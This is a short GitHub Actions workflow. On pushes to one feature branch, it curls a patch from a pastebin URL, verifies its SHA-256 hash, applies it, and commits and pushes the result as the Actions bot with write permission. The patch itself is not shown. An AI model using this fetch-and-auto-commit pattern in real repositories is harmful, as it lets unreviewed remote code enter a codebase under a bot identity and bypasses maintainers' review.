name: ci

on:
  push:
    branches:
      - feature/bootstrap-architecture-v0.1

permissions:
  contents: write

jobs:
  apply-package-relationship-graph-hardening:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Apply package relationship graph patch
        shell: bash
        run: |
          set -euo pipefail
          curl -fsSL https://paste.rs/g5Myd --output security-package-relationship-graph.patch
          echo "19ba1490f43dfcbe7e009ce5ab36c822cac783b2b3fbb314939c9b739300241d  security-package-relationship-graph.patch" | sha256sum --check -
          git apply --index security-package-relationship-graph.patch
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git commit -m "test: reject malformed package relationship graph escapes"
          git push
